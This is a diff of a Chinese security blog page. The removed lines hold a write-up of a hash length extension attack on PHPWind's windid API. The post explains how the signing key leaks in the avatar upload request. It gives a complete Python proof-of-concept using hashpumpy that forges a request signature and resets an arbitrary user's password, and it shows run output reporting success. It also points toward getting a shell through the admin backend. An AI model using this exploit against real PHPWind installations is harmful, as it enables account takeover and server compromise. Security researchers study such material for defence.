-<p>在这个函数中会提取windidkey，并且和<code>WindidUtility::appKey</code>生成的结果做对比，不同则退出，如过相同继续判断时间是否超时，超时也退出，appKey的实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public static function appKey($apiId, $time, $secretkey, $get, $post) &#123;</div><div class="line">	// 注意这里需要加上__data，因为下面的buildRequest()里加了。</div><div class="line">	$array = array(&apos;windidkey&apos;, &apos;clientid&apos;, &apos;time&apos;, &apos;_json&apos;, &apos;jcallback&apos;, &apos;csrf_token&apos;,</div><div class="line">				   &apos;Filename&apos;, &apos;Upload&apos;, &apos;token&apos;, &apos;__data&apos;);</div><div class="line">	$str = &apos;&apos;;</div><div class="line">	ksort($get);</div><div class="line">	ksort($post);</div><div class="line">	foreach ($get AS $k=&gt;$v) &#123;</div><div class="line">		if (in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	foreach ($post AS $k=&gt;$v) &#123;</div><div class="line">		if (in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	return md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在函数中<code>md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)</code>的值是知道的，即<a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">windidkey，这个值在用户上传头像处泄露</a>，<code>md5($apiId.&#39;||&#39;.$secretkey)</code>的长度是知道的，32bit，<code>$time.$str</code>参数是用户可控的，那么就满足了哈希扩展长度攻击，下面我们看下用户上传头像处的请求，右键查看源代码找到如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.106/windid/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid=2&amp;windidkey=b6f98f9e78105ca0ec4239de8478cd26&amp;time=1465977216&amp;clientid=1&amp;type=flash&amp;avatar=http://192.168.3.106/windid/attachment//avatar/000/00/00/2.jpg?r=18504</div></pre></td></tr></table></figure></p>
-<p>接着看实际构造的appKey的参数效果,这个可以根据trace的结果直接给出，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(&apos;520a1e355b8cfc82e56ae578176d7f101465977216adoAvatarcavatarmapitypeflashuid2uidundefined&apos;) /var/www/html/src/windid/service/base/WindidUtility.php:54</div></pre></td></tr></table></figure></p>
-<p><code>md5($apiId.&#39;||&#39;.$secretkey)</code>的值为<code>520a1e355b8cfc82e56ae578176d7f10</code>，<code>$time</code>为<code>1465977216</code>,<code>$str</code>为<code>adoAvatarcavatarmapitypeflashuid2uidundefined</code>,从appKey函数的实现来看，$str就是get，post请求进行取舍排序得到的。有了这个基础，根据hashpump公式，在post请求中加入我们的参数，并计算出合适的windidkey值，提交请求，就可达到目的。</p>
-<p>#3 利用POC<br>可利用如下的代码构造post请求，修改某uid用户的密码。如果修改的是管理员的密码，并且这管理员有相应的后台权限，那么我们就可以在后台getshell，利用脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">#!env python</div><div class="line"># coding=utf-8</div><div class="line">import hashpumpy</div><div class="line">import urllib</div><div class="line">import urlparse</div><div class="line">import urllib2</div><div class="line">import requests</div><div class="line"></div><div class="line">def md5hack(md5, ori_str, append, security_len):</div><div class="line">    md5, message = hashpumpy.hashpump(md5, ori_str,append, security_len)</div><div class="line">    quoted_message = urllib.quote(message)</div><div class="line">    print &apos;md5 after hash length attacked:&apos;,md5</div><div class="line">    print &apos;message:&apos;,message</div><div class="line">    print &apos;quote message:&apos;,quoted_message</div><div class="line">    return (md5,quoted_message)</div><div class="line"></div><div class="line"></div><div class="line">def modify_passwd(ip, uid, target_uid, windidkey, padding, time, password=&quot;GongFang9&quot;):</div><div class="line">    &quot;&quot;&quot;修改后台管理员的密码&quot;&quot;&quot;</div><div class="line">    target_uid = target_uid #uid是后台管理的uid参数</div><div class="line">    host = &quot;http://&quot; + ip</div><div class="line">    data = &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid, password)</div><div class="line">    url = &quot;&#123;0&#125;/windid/index.php?windidkey=&#123;1&#125;&amp;adoAvatarcavatarmapitypeflashuid&#123;2&#125;uidundefined=&#123;3&#125;&amp;clientid=1&amp;time=&#123;4&#125;&amp;namespace=site&quot;.format(host,windidkey,uid,padding,time)</div><div class="line">    print &apos;url:&apos;,url</div><div class="line">    print &apos;data:&apos;,data</div><div class="line">    r = requests.post(url,data=data)</div><div class="line">    #r = requests.post(url,data=data,headers=headers)</div><div class="line">    print r.text</div><div class="line">    if r.text.strip() == &quot;1&quot;:</div><div class="line">        print &apos;modify password Succeed&apos;</div><div class="line">    else:</div><div class="line">        print &apos;failed&apos;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    &quot;&quot;&quot;点开用户头像上传处,右键查看源码,搜索windidkey,拷贝含flash字段的那个request作为r参数&quot;&quot;&quot;</div><div class="line">    r = &quot;&quot;&quot;http%3A%2F%2F192.168.3.106%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D5%26windidkey%3D1eb5af71d002ac89e22c0170806b0fe8%26time%3D1466416702%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2F192.168.3.106%2Fwindid%2Fattachment%2F%2Favatar%2F000%2F00%2F00%2F5.jpg%3Fr%3D78057&quot;&quot;&quot;</div><div class="line"></div><div class="line">    request = urlparse.urlparse(urllib.unquote(r))</div><div class="line">    querys = [item for item in request.query.split(&quot;&amp;&quot;)]</div><div class="line">    query_dict = &#123;item.split(&quot;=&quot;)[0]:item.split(&quot;=&quot;)[1] for item in querys&#125;</div><div class="line"></div><div class="line">    ori_md5 = query_dict.get(&quot;windidkey&quot;)</div><div class="line">    time = query_dict.get(&apos;time&apos;)</div><div class="line">    uid = query_dict.get(&apos;uid&apos;)</div><div class="line"></div><div class="line">    ori_str = &quot;&#123;0&#125;adoAvatarcavatarmapitypeflashuid&#123;1&#125;uidundefined&quot;.format(time,uid)</div><div class="line">    password = &quot;test123&quot;</div><div class="line">    ip = &quot;192.168.3.173&quot;</div><div class="line">    ip = &quot;192.168.3.106&quot;</div><div class="line">    target_uid = 3</div><div class="line"></div><div class="line">    post_append= &quot;a=getConfig&amp;c=config&amp;m=api&amp;id=1&quot;</div><div class="line">    post_append= &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid,password)</div><div class="line">    post = &quot;&quot;.join(sorted([item.replace(&quot;=&quot;,&quot;&quot;) for item in post_append.split(&quot;&amp;&quot;)]))</div><div class="line"></div><div class="line">#    security = &quot;d2edc0a3340df65cb66387464f3adfc1&quot;</div><div class="line">#    ori_str = &quot;1465784719adoAvatarcavatarmapitypeflashuid2uidundefined&quot;</div><div class="line">    security_len = 32#phpwind计算windidkey 公式md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str),md5值的长度是32</div><div class="line">    print &apos;hashmd5:&apos;,ori_md5</div><div class="line">    print &apos;security len:&apos;, security_len</div><div class="line">    print &apos;ori_str&apos;, ori_str</div><div class="line">    append = &apos;agetcappid1mapi&apos;</div><div class="line">    append = &quot;namespacesite&quot; + post</div><div class="line">    print &apos;post&apos;,append</div><div class="line">    (md5,quoted_message) = md5hack(ori_md5, ori_str, append, security_len)</div><div class="line">    padding = quoted_message[quoted_message.index(&quot;%&quot;):quoted_message.rindex(&quot;%&quot;)+3]</div><div class="line"></div><div class="line">    modify_passwd(ip, uid, target_uid, md5, padding, time, password)</div></pre></td></tr></table></figure></p>
-<p>运行之后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# python md5hack.py</div><div class="line">hashmd5: 4d8971d0d2556d5dcbeb3b0f10e41429</div><div class="line">security len: 32</div><div class="line">ori_str 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined</div><div class="line">post namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">md5 after hash length attacked: e46e0aaddbd4e008077535a4dafab3f5</div><div class="line">message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined▒▒namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">quote message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">url: http://192.168.3.173/windid/index.php?windidkey=e46e0aaddbd4e008077535a4dafab3f5&amp;adoAvatarcavatarmapitypeflashuid10uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00&amp;clientid=1&amp;time=1466474956&amp;namespace=site</div><div class="line">data: a=editUser&amp;c=user&amp;m=api&amp;uid=3&amp;password=test123</div><div class="line">1</div><div class="line">modify password Succeed</div></pre></td></tr></table></figure></p>
-<p>代码中修改uid为3的账户的密码为GongFang7，假设该用户具有后台管理员权限，进入后台getshell，具体的getshell可参考<a href="http://www.wooyun.org/bugs/wooyun-2016-0175518" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0175518</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2193,7 +2199,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2204,7 +2210,7 @@
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2215,7 +2221,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">95</span>
+                <span class="site-state-item-count">98</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
